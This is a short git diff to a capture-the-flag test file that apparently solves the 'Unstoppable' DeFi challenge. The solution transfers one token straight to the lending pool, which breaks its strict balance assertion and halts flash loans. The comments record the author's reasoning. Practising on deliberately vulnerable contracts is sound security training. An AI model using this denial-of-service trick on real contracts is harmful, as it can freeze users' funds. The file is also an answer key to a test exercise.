@@ -40,6 +40,19 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // Ok, it's using reentrancy guard so there goes my first thought
+
+        // Could I really just send the contract some DVT or something to mess up this assertion on line 40???? 
+        // `assert(poolBalance == balanceBefore);`
+
+        // Lol apparently I can
+
+        // SOLUTION: ==========================================================
+
+        const tx = await this.token.connect(attacker).transfer(this.pool.address, 1);
+        tx.wait();
+
     });
 
     after(async function () {
